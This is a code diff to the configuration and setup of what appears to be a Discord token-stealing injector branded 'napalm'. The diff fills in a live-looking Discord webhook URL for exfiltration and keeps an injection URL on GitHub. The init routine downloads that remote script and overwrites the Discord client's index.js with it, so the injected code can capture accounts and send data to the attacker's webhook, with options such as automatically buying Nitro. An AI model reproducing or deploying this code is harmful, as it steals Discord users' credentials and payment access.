@@ -10,10 +10,10 @@ const config = {
     auto_buy_nitro: true,
     ping_on_run: true,
     ping_val: "@here",
-    embed_name: "~~branding~~",
-    embed_icon: "~~icon~~",
+    embed_name: "napalm",
+    embed_icon: "https://th.bing.com/th/id/OIP.4JaGWR5WjiEbnWrxBxoicQHaJ3?w=186&h=248&c=7&r=0&o=5&pid=1.7",
     embed_color: 8363488,
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://discord.com/api/webhooks/1076229196268974251/RzyIAXoJPtF6BCdnjaOxseEkNafmGfNTwYthzppTa9MAcTGFwTWwKBPs33TjEtNNUABg",
     injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
@@ -115,7 +115,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
+        res.replace('core.asar', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
